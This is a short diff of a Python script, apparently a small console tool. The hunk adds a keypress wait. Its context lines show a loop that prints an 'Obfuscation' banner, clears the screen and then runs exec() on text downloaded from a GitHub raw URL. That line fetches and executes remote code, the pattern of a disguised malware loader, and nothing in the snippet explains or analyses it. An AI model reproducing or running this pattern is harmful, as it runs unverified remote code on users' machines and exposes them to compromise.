@@ -20,6 +20,7 @@ Obfuscation = """
 print(Obfuscation)
 while True:
     print(Obfuscation)
+    msvcrt.getch()
     os.system('cls')
     print("Leaving Credit")
     exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/FyreChanger%2B').text)
